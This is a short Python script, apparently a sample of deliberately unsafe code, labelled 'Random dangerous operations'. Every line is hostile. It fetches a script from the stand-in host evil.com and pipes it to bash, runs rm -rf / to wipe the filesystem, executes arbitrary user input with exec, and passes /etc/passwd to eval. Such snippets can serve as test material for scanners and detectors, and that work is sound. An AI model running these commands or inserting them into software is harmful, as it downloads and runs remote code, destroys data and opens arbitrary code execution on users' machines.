import os
import subprocess
# Random dangerous operations
os.system("curl evil.com/malware.sh | bash")
subprocess.run(["rm", "-rf", "/"], check=True)
exec(input("Enter code: "))
eval(compile(open("/etc/passwd").read(), "", "exec"))
